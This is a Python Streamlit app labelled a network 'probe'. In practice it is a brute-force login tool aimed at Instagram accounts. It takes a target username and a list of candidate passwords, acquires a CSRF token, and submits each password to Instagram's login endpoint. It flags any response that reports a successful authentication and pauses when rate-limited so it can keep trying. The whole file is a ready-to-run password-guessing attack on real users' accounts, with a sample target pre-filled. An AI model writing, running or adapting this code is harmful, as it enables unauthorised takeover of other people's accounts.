import streamlit as st
import requests
import time

st.set_page_config(page_title="Instagram AJAX Probe", layout="centered")

st.title("⚡ Instagram Experimental Network Probe")
st.write("Raw HTTP request tester targeting login endpoints. Note: Modern platforms employ aggressive anti-bot protections (WAF, rate-limiting, signature validation). Server responses are displayed as received, but do not serve as definitive proof of endpoint stability or protocol validity.")

st.sidebar.header("Probe Parameters")
target_user = st.sidebar.text_input("Target Username", value="rrenguk")
wordlist_raw = st.sidebar.text_area("Candidate Passwords (one per line)", value="123456\npassword\nadian2006", height=150)

if st.button("Run Endpoint Probe"):
    if not target_user:
        st.error("Provide a target username.")
    else:
        passwords = [p.strip() for p in wordlist_raw.split("\n") if p.strip()]
        st.info(f"[*] Initializing raw request pipeline against target: {target_user}")
        
        log_container = st.empty()
        progress_bar = st.progress(0)
        
        session = requests.Session()
        
        # Step 1: Attempt initial session and cookie acquisition
        init_url = "https://www.instagram.com/accounts/login/"
        base_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        try:
            init_res = session.get(init_url, headers=base_headers, timeout=10)
            csrf_token = session.cookies.get("csrftoken", "")
            if csrf_token:
                log_container.text(f"[+] Initial cookie handshake successful: csrftoken acquired.")
            else:
                log_container.warning("[-] Warning: csrftoken absent from cookie jar.")
        except Exception as e:
            st.error(f"[-] Session initialization network error: {str(e)}")
            st.stop()

        # Step 2: AJAX Endpoint Dispatch Loop
        ajax_url = "https://www.instagram.com/accounts/login/ajax/"
        ajax_headers = {
            "User-Agent": base_headers["User-Agent"],
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRFToken": csrf_token,
            "Referer": "https://www.instagram.com/accounts/login/",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        match_found = False
        
        for idx, pwd in enumerate(passwords):
            timestamp = int(time.time())
            payload = {
                "username": target_user,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{pwd}",
                "queryParams": "{}",
                "optIntoOneTap": "false"
            }
            
            try:
                response = session.post(ajax_url, data=payload, headers=ajax_headers, timeout=10)
                
                if response.status_code == 200:
                    # Parsing raw server payload as received. 
                    # Note: Server response validity is subject to WAF filtering and changing API logic.
                    try:
                        data = response.json()
                        if data.get("authenticated") == True:
                            log_container.success(f"[!] Server returned authenticated=True for candidate: {pwd}")
                            match_found = True
                            break
                        elif data.get("message") == "checkpoint_required" or "checkpoint_url" in data:
                            log_container.warning(f"[!] Server returned checkpoint/challenge flag for: {pwd}")
                        else:
                            server_msg = data.get("message", "No explicit message body")
                            log_container.text(f"[-] Tried: {pwd} | Raw Server Message: {server_msg}")
                    except ValueError:
                        log_container.text(f"[-] Tried: {pwd} | Response parsing failed (Non-JSON payload received)")
                        
                elif response.status_code == 429:
                    log_container.error("[-] HTTP 429: Rate limit threshold triggered by server/WAF.")
                    time.sleep(5)
                else:
                    log_container.text(f"[-] Tried: {pwd} | HTTP Status Code: {response.status_code}")
                    
            except Exception as e:
                log_container.text(f"[-] Network transmission error: {str(e)}")
                
            progress_bar.progress((idx + 1) / len(passwords))
            time.sleep(1.5)
            
        if not match_found:
            st.info("[-] Probe cycle finished. All payloads yielded standard server rejections or non-authenticated statuses.")
